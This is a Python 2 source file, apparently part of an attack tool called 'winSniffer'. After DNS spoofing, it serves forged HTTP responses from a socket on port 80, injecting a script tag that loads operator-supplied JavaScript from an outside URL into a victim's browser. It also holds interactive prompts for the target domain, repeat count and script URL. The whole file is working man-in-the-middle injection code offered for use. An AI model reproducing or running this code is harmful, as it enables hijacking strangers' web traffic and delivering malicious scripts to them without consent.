# coding:utf-8

import socket
import requests

"""注入代码，在对目标主机进行DNS欺骗之后，
利用socket将伪造的数据包发送给目标主机
如果发送成功就断开socket连接"""


def injectdata(domain,host,jslink):
    
    port = 80
    jslink = jslink

    response = """HTTP/1.1 200 OK
    Date: Thu, 12 Apr 2016 15:25 GMT
    Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
    Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
    ETag: "20e2b8b-3c-48ee99731f380"
    Accept-Ranges: bytes
    Content-Lenght: 90
    Connection: close
    Content-Type: text/html


    <head>
    <script src="{}"></script>
    </head>
    """.format(jslink)

    """建立socket套接字"""

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # SOL_SOCKET套接字等级    SO_REUSEADDR设置端口释放后理解就能使用
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 绑定端口和地址信息
    server_address = (host, port)
    print '[+] Injection URL - http://{}:{}'.format(host,port)
    server.bind(server_address)

    server.listen(1)

    """返回伪造的响应包"""

    for i in range(0,2):
        if i>= 1:
            print "[+] Target was requesting: {}".format(domain)
            try:
                connection,client_address = server.accept()
                redirect = response + """<body>
    <meta http-equiv="refresh" content="0; URL='http://{}'"/>
    </body>""".format(domain)
                redirect = response
                connection.send("%s" % redirect)
                print "[+] Script Injected on: ", client_address
                connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                connection.close()
            except KeyboardInterrupt:
                server.close()
        try:
            connection,client_address = server.accept()
            connection.send("%s" % response)
            print "[+] Script Injected on: ", client_address
            connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
            connection.close()
        except KeyboardInterrupt:
            server.close()

"""开启注入，设置对应参数"""

def confirm_inject():

    print """
--------------------------------------
|Script injection?(Defaults to False)|
|        If open, enter true         |
--------------------------------------
"""

    choose = raw_input("winSniffer >>")

    if choose == "true" or choose == "TRUE":
        print "[*] Please enter domain"
        domain = raw_input("winSniffer >>")
        print "[*] Please enter times(Recommended 5-10)"
        times = raw_input("winSniffer >>")
        print "[*] Please Script URL"
        js_url = raw_input("winSniffer >>")

    else:
        print "[*] Set end"
        return None,None,None
        
    return domain,times,js_url
